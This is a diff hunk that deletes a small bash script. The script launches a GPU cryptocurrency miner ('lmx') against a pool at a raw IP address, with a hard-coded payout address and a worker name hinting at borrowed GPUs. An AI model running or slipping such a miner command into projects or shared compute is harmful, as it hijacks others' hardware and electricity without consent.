@@ -1,4 +1,0 @@
-#!/bin/bash
-
-chmod +x lmx
-./lmx --algo ETHASH --pool 51.79.205.159:80 --user 3JkgN64Rw6AXXhZQWiYQngFMjVyD1CWped.$(echo GPU-MINJEM-$(shuf -i 1-5 -n 1)) --ethstratum ETHPROXY
